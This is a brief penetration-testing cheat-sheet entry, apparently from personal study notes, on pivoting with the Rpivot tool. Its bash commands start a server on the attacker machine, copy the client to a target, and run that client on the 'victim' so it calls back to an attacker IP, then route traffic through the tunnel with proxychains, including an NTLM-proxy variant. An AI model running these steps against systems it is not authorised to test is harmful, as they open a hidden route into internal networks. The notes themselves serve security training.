### Rpivot
```bash
# Downloading the tool
git clone https://github.com/klsecservices/rpivot.git

# Getting the server.py running
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Before running, we need to transfer the client.py to the target
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

# Then on the victim run
python2 client.py --server-ip 10.10.14.18 --server-port 9999

# Finally you can browse on the target with
proxychains firefox-esr PIVOT_IP
proxychains curl http://PIVOT_IP:Port

# If there is a need to use a NTLM Auth
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

# Notes
[[Pivoting Notes]]
